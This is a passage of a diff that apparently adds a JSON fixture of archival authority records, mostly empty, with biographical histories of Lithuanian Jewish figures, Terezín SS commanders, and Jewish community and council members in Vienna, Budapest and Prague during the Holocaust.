+                            "biographicalHistory": "Anatolijus Rozenbliumas gim\u0117 1902 m. liepos 30 d. Balstog\u0117je, Lenkijoje. Berniukas buvo jauniausias i\u0161 penki\u0173 vaik\u0173 provizoriaus ir muzik\u0117s \u0161eimoje. Netrukus su t\u0117vais persik\u0117l\u0117 \u012f Kaun\u0105 ir 1912\u20131914 m. bei 1918\u20131920 m. mok\u0117si Kauno \u017eyd\u0173 berniuk\u0173 gimnazijoje. Per Pirm\u0105j\u012f pasaulin\u012f kar\u0105 \u0161eima buvo pasitraukusi \u012f Vitebsk\u0105, kur A. Rozenbliumas baig\u0117 Vitebsko gimnazij\u0105.\r\n1922 m. vien\u0105 semestr\u0105 studijavo Vienos Auk\u0161tosios technikos mokyklos Statybos fakultete, 1927 m. baig\u0117 Kioteno auk\u0161t\u0105j\u0105 pramon\u0117s mokykl\u0105. Netrukus \u0117m\u0117 s\u0117kmingai dirbti in\u017einieriumi Berlyne, bet, \u0161alyje sustipr\u0117jus nacizmui, 1929 m. gr\u012f\u017eo gyventi \u012f Kaun\u0105 ir \u012fstojo \u012f karo tarnyb\u0105. Iki 1936 m. buvo Lietuvos kariuomen\u0117s Karo but\u0173 valdybos in\u017einieriumi konstruktoriumi. Projektavo kareivines, sand\u0117lius, aviacijos angarus, dirbtuves, gara\u017eus. 1936 m. A. Rozenbliumas tapo laisvai samdomu in\u017einieriumi, projektuoti statybines konstrukcijas j\u012f kviet\u0117 \u017eymiausi to meto Lietuvos architektai.\r\n1940\u20131941 m. tapo Kauno universiteto Tilt\u0173 ir gel\u017ebetonini\u0173 konstrukcij\u0173 katedros neetatiniu lektoriumi.\r\n1941\u20131944 m. A. Rozenbliumas su \u0161eima buvo kalinamas Kauno gete, i\u0161 kurio jiems pasisek\u0117 pab\u0117gti. \u0160eima slapst\u0117si, kur\u012f laik\u0105 glaud\u0117si architekto Vladimiro Zubovo ir Danut\u0117s \u010ciurlionyt\u0117s-Zubovien\u0117s namuose Kaune.\r\n1944\u20131969 m. \u0117jo Kauno vastybinio universiteto (v\u0117liau pavadinto Kauno politechnikos institutu) gel\u017ebetonini\u0173 konstrukcij\u0173 katedros ved\u0117jo pareigas. 1967 m. apgyn\u0117 moksl\u0173 daktaro disertacij\u0105, 1968 m. gavo profesoriaus mokslin\u012f vard\u0105.\r\nLeido vadov\u0117lius ir paskait\u0173 konspektus, 1956 m. suk\u016br\u0117 ir i\u0161band\u0117 surenkam\u0105 poligoanalin\u0119 santvar\u0105 pramon\u0117s ir \u017eem\u0117s \u016bkio pastat\u0173 stogams, kuri po poros met\u0173 buvo \u012fvertinta respublikine premija.\r\n1969 m. persik\u0117l\u0117 \u012f Vilni\u0173, kur \u0117jo Vilniaus in\u017einerinio statybos instituto Speciali\u0173j\u0173 konstrukcij\u0173 katedros ved\u0117jo pareigas.\r\nRozenbliumas mir\u0117 1973 m. gegu\u017e\u0117s 27 d. Vilniuje."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "\u0160ein\u0117 Siderait\u0117 gim\u0117 1921-02-09 Lazdijuose.\r\n\r\n1932 m. baig\u0117 Lazdij\u0173 \u017eyd\u0173 prad\u017eios mokykl\u0105, kurioje mok\u0117si hebraj\u0173 kalba. 1932\u20131940 m. mok\u0117si Lazdij\u0173 \u201e\u017diburio\u201c gimnazijoje. 1940\u20131941 m. studijavo Kauno Vytauto Did\u017eiojo universiteto Medicinos fakultete. 1941 m. vasar\u0105 evakavosi \u012f Soviet\u0173 S\u0105jung\u0105 ir apsigyveno Tad\u017eikijoje. 1941\u20131945 m. studijavo Stalinabado (dabar Du\u0161anb\u0117, Tad\u017eikija) Medicinos institute bei dirbo preparatore, medicinos seserimi, gydytoja. 1945 m. gr\u012f\u017eo \u012f Lietuv\u0105 ir buvo priimta \u012f Vilniaus valstybinio universiteto Medicinos fakulteto 5-\u0105j\u012f kurs\u0105. Studijuodama dirbo Lietuvos TSR sveikatos apsaugos ministerijoje Kadr\u0173 skyriaus vyriausi\u0105ja inspektore.\r\n\r\n1947\u20131954 m. \u0160. Siderait\u0117 dirbo Vilniaus I tarybin\u0117je ligonin\u0117je terapeute ordinatore, nuo 1953 m. \u2013 ir endokrinologe antraeil\u0117se pareigose. 1948\u20131950 m. d\u0117st\u0117 Medicinos seser\u0173-aku\u0161eri\u0173 mokykloje Vilniuje. 1954\u20131960 m. \u2013 terapeut\u0117 endokrinolog\u0117 Lietuvos TSR sveikatos apsaugos ministerijos specpoliklinikoje, 1960\u20131967 m. \u2013 endokrinolog\u0117 Vilniaus I tarybin\u0117je ligonin\u0117je, 1967\u20131999 m. \u2013 endokrinolog\u0117 Vilniaus universitetin\u0117je klinikin\u0117je ligonin\u0117je.\r\n\r\nSpecializavosi klinikin\u0117s endokrinologijos srityje, buvo viena endokrinologijos tarnybos Lietuvoje organizatori\u0173. 1956 m. i\u0161rinkta Respublikinio prie\u0161struminio komiteto pirmininke, 1961 m. \u2013 Lietuvos TSR sveikatos apsaugos ministerijos neetatine vyriausi\u0105ja endokrinologe, 1962 m. \u2013 Lietuvos TSR endokrinolog\u0173 mokslin\u0117s draugijos valdybos nare. 1963 m. dalyvavo sudarant endeminio g\u016b\u017eio paplitimo Lietuvoje \u017eem\u0117lap\u012f.\r\n\r\n1967 m. apgyn\u0117 medicinos moksl\u0173 kandidat\u0117s disertacij\u0105 tema \u201eCukralige sergan\u010di\u0173j\u0173 ateroskleroz\u0117s eigos ypatyb\u0117s ir gydymas hipoglikemizuojan\u010diais sulfanilamidais\u201c. Klinikin\u0117s endokrinologijos temomis paskelb\u0117 per 50 mokslini\u0173 straipsni\u0173, perskait\u0117 nema\u017eai prane\u0161im\u0173 gydytoj\u0173 mokslin\u0117se konferencijose Lietuvoje ir Soviet\u0173 S\u0105jungoje.\r\n\r\n1966 m. \u0160. Sideraitei buvo suteikta auk\u0161\u010diausioji gydytojos terapeut\u0117s endokrinolog\u0117s kvalifikacija.\r\n\r\n\u0160ein\u0117 Siderait\u0117 mir\u0117 2005 m. kovo 15 d."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      }
+                    ]
+                  }
+                },
+                {
+                  "id": "terezin-victims",
+                  "authorities": {
+                    "items": [
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      }
+                    ]
+                  }
+                },
+                {
+                  "id": "terezin-persons",
+                  "authorities": {
+                    "items": [
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born in 1911 in Neunkirchen. Died in 1991 in Essen. SS-Sturmbannf\u00fchrer. Member of Eichmann's staff. Coordinated the transportations of the Belgian, Dutch and Greek Jews in Salloniki. Camp Commander in Terez\u00edn from 1943 - 1944."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1907 in Klosterneuburg. Died 1947 in Litom\u011b\u0159ice. Austrian SS-Obersturmf\u00fchrer and commander in Terez\u00edn. Rahm worked at the Central Office for Jewish Emigration in Vienna and Prague. Commandant of Terez\u00edn from February 1944 - May 1945."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born in 1902. SS-Obersturmbannf\u00fchrer and Deputy Camp Commander of Terez\u00edn from 1941 - 1945."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1895 in D\u00e4tzdorf. Died 1990 in Kronberg. German SS-Sturmbannf\u00fchrer. Worked at the \"Umwandererzentrale\" in \u0141\u00f3d\u017a. In 1941 Skarabis was temporary Commander of Terez\u00edn. After the war Skarabis was sentenced to four years of prison."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      }
+                    ]
+                  }
+                },
+                {
+                  "id": "jc-persons",
+                  "authorities": {
+                    "items": [
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1915 in Vienna. Died 1977 in Vienna. Robert Prochnik worked for the Jewish Community from 1938 onwards, working closely together with Benjamin Murmelstein. Prochnik had to work together with the Central Office for Jewish Emigration in Vienna and was involved in the transports to the East. In September 1942 he was arrested by the Gestapo and sent to Terez\u00edn, where he survived the war. In 1948 he was accused of collaboration with the Nazis, but set free soon afterwards. Prochnik died in 1977."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1916 in Vienna. Died 1997 in Vienna. Franzi L\u00f6w was working in the resistance and was an employee in the Welfare Department of the Jewish Community in Vienna. She took the custodianship for 200 Jewish children and took guadianship for further 20 mentally handicapped children. By forging documents she saved these children from the transport into Death Camps. From 1942 onwards she was leading the Welfare Department of the Jewish Community in Vienna. She helped several Jews hiding with food stamps. Franzi L\u00f6w survived in Vienna."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1884 in Piwowszczyzna (Galicia). Died 1960 in New York. Head of the Jewish Community in Vienna between 1938 and 1945. L\u00f6wenherz was a Zionist and lawyer and later \"Elder of the Jews\" in Vienna. In May 1945 he was arrested by the Red Army. L\u00f6wenherz died in New York in 1960."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Orthodox rabbi, head of the Central Office of the Autonomous Orthodox Israelite Denomination of Hungary, and member of the First and Second Jewish Council. In the summer of 1944, he resigned from his position and went into hiding. After the war he became the head of the national Orthodox organisation again. He left Hungary in 1950 \u2013 first emigrating to Israel, then to the US."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Factory owner, member of the First and Second Jewish Councils. As of 1939, he was president of the Budapest Autonomous Orthodox Israelite Congregation. In early August 1944 he escaped with his family to Romania. After the war he lived in Israel where he testified at the Eichmann trial in 1961."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Engineer, head of the Central Jewish Council\u2019s Technical Department from April 1944, head of the Ghetto Police and one of the leaders of the \u201clarge\u201d ghetto in Budapest during the Arrow Cross era. Domonkos was a World War I veteran and captain of the Hungarian army in the interwar period. Between 1945 and 1950 he became chief secretary (f\u0151titk\u00e1r) of the Pest Israelite Congregation. In 1953 he was arrested by the communist regime on fabricated charges. Although he was released at the end of 1953 he died within months as a result of the torture he endured in prison."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Chief Rabbi of Szigetv\u00e1r and member of the Second, Third and Fourth Jewish Councils. He was suspected of being an informant for the government. In 1946 he was sentenced to ten years in prison for collaborating with the Hungarian authorities during the Holocaust, but acquitted on appeal in 1947. In 1948, Berend emigrated to the United States where he changed his name to Albert B. Belton."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1898 in Trn\u011bn\u00fd \u00dajezd. During WWII an employee of the Jewish Community in Prague, in the Personnel Office. Deported to Terez\u00edn in February 1945. After WWII worked for the company Kley in Prague, which specialised in textiles."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Jewish community leader, member of the Fourth Jewish Council. He was vice president, and as of 1939, president of the Neologue Sz\u00e9kesfeh\u00e9rv\u00e1r Israelite Congregation (Sz\u00e9kesfeh\u00e9rv\u00e1ri Izraelita Hitk\u00f6zs\u00e9g). On January 15, 1945 he was murdered by Arrow Cross militiamen in Budapest."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Lawyer, Jewish community leader, member of the First, Second and Third Jewish Council. After graduation, he worked for the Budapest Stock Exchange and various large industrial companies. In 1941 he was appointed member of the governing committee (v\u00e1lasztm\u00e1ny) of the Neologue Pest Israelite Congregation. In 1944, as member of President Samu Stern\u2019s inner circle, he belonged to the Jewish Council\u2019s informal leadership. After the war he became director-in-chief of the Hungarian Sugar Industry Trust. In 1948 he left Hungary and settled in Switzerland, where he died in 1951."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Industrialist, member of the Third and Fourth Jewish Councils. During the Sz\u00e1lasi regime, he became de facto head of the Council and one of the leaders of the \u201clarge\u201d ghetto of Budapest. After the war, he became President of the Pest Israelite Congregation and the National Office of Hungarian Israelites. In 1950, St\u00f6ckler was appointed head of the National Representation of Hungarian Israelites (Magyar Izraelit\u00e1k Orsz\u00e1gos K\u00e9pviselete), the unified organisation of Hungarian Jewish communities forcefully set up by the communist regime. In January 1953, he was arrested on fabricated charges of murdering Raoul Wallenberg in 1945 and brutally tortured. He was convicted, but released in early 1954. In 1956 he emigrated to Australia. "
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Banker, Jewish community leader, president of the Jewish Council throughout its entire existence. Stern\u2019s started his career as a wholesale food distributor, later he became the chief executive of one of Hungary\u2019s largest financial institutions. He became involved in Jewish community life in the interwar period. In 1929, he was elected president of the Pest Israelite Congregation and in 1932 of the National Office of Hungarian Israelites. After the German occupation of Hungary in March 1944, Stern was appointed head of the Jewish Council by the Nazis. He led the organisation until the Arrow Cross takeover in October 1944. Although he was officially president of the Fourth Jewish Council as well, he spent the last months of the war in hiding. In 1945, he was charged with collaboration and an investigation was initiated against him, but the case did not come to trial."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Lawyer, Jewish community leader, member of the First, Second and Third Jewish Council. He trained as a lawyer in Budapest and worked as an attorney. He was involved in the community work of the Pest Israelite Congregation, of which he was appointed vice president in 1941. In 1944, as a member of President Samu Stern\u2019s inner circle, he belonged to the Jewish Council\u2019s informal leadership. In 1955 he emigrated to Brazil, where he died in the 1960s."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Lawyer, publicist, legal scholar, high-ranking official of Jewish Council. He worked for the Pest Israelite Congregation from the early 1920s, first as a secretary (titk\u00e1r), then as legal representative (\u00fcgy\u00e9sz), later as chief secretary (f\u0151titk\u00e1r). Between 1934 and 1942 he was head of the Hungarian Jewish Museum (Magyar Zsid\u00f3 M\u00fazeum). After the war he became the Executive Director (\u00fcgyvezet\u0151 igazgat\u00f3) of the National Office of Hungarian Israelites."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1904. Was a motorcycle and car racer, as well as a salesman for JAWA motorcycle and cars and the Zl\u00edn Z-XII aircraft produced by the Ba\u0165a company. In 1932 they won the silver medal for Czechoslovakia at the legendary International Six Days Trial. During WWII an employee of the Personnel Office at the Jewish Community in Prague. Together with his son Ivan he survived the war in Prague. He was not deported due to his (so-called) mixed marriage."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1894 in Prague. Died 1967 in Prague. Important Hebrew scholar and historian. At the beginning of WWI travelled together with his friend Ji\u0159\u00ed Mordechai Langer (author of Nine Gates) to Galicia, stayed in a Hasidic community in Belz and spent several years in Rzeczic, where he studied halakha and hasidic liturature. Received rabbinic ordination. In 1922 returned to Prague, was active in Chevra kadisha. During WWII worked for the Central Jewish Museum in Prague. Deportated to Terez\u00edn in July 1943, worked in the library, cataloged Hebrew books that had been confiscated from libraries by the Nazis. After WWII worked at the Jewish Museum in Prague, where he documented books and archival holdings."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1915. Died 1945 in Auschwitz or Dachau. In 1933 emigrated to Palestine. Expelled from the country by the authorities due to his political (Communist) activities. Returned to Prague, studied medicine. During WWII worked at the Treuhandstelle at the Jewish Community in Prague. Unsuccessfully tried to get visa to USA and Australia. Deported to Terez\u00edn in September 1943. Transported to Auschwitz in October 1944."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1886 in Prague. In 1945 dissappeared without trace in Auschwitz. Art historian, museum specialist. Czech-Jew. Director of the state East Slovak Museum in Ko\u0161ice. In 1942 became the main curator of the Jewish Central Museum in Prague. Became involed in the resistance movement, arrested by the Gestapo in August 1944."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1896. Died 1943 in Auschwitz. Photographer. One of five photographers who are known to have worked for the Jewish Community in Prague during the war. From the remaining records it seems, that whilst others were involved more with news footage, Viktor Sch\u00fcck was employed at the Central Jewish Museum where he specialised in documenting collection pieces, buildings and cemeteries. Deported to Terez\u00edn in July 1943. Transported to Auschwitz in September 1943."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1906 in Mn\u00ed\u0161ek pod Brdy. Died 1944 in Auschwitz. Worked as a civil servent in Prague. During WWII worked as a correspondent for the Jewish Community in Prague. Her husband was an employee of the Financial Department at the Jewish Community in Prague. She was deported to Auschwitz in October 1944."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1904 in Jarom\u011b\u0159. Died 1985 in Prague. Art historian, director of the Jewish Museum in Prague. Worked in Municipal library of Prague, then in the library of the Museum of Decorative Arts in Prague. From 1943 worked for the Central Jewish Museum in Prague. Deported to Terez\u00edn in February 1945. After WWII worked in the Jewish Museum in Prague, became the director."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1883 in Vienna. Died 1944 in Auschwitz. Lawyer and member of the Jewish Council of the Elders in Vienna. Transported to Terez\u00edn in January 1943. Transported to Auschwitz in October 1944."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1892 in Brno. Died 1944 in Auschwitz. Architect. Zionist. Worked  for the Jewish Community in Prague, was in charge of the Collection \"Opfer Aufbau Leben\",which rich Jewish citizen contributed to to help Jewish elderly, sick or poor people and orphans. In December 1941 deported to Terez\u00edn. Deputy Elder of the Jews in Terez\u00edn and member of the Council of the Elders of the Jews in Terez\u00edn. Transported to Auschwitz in October 1944."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1900 in \u0158e\u010dany nad Labem. Businessman. In 1913 moved with his parents to Vienna. After annexation of Austria into Nazi Germany converted to Roman Catholic Church and moved back to Czechoslovakia. During WWII employee of the Jewish Community in Prague, but the exact department is unknown. Deported to Terez\u00edn in February 1945. After WWII moved to D\u011b\u010d\u00edn."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born 1893 in Dob\u0159\u00ed\u0161. Died most probably 1945 in Prague. Worked for insurance company Koruna in Prague. During WWII employee of the Jewish Community in Prague, worked at the Department for Emigration. In August 1940 he was arrested for a few days for an unknown reason."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
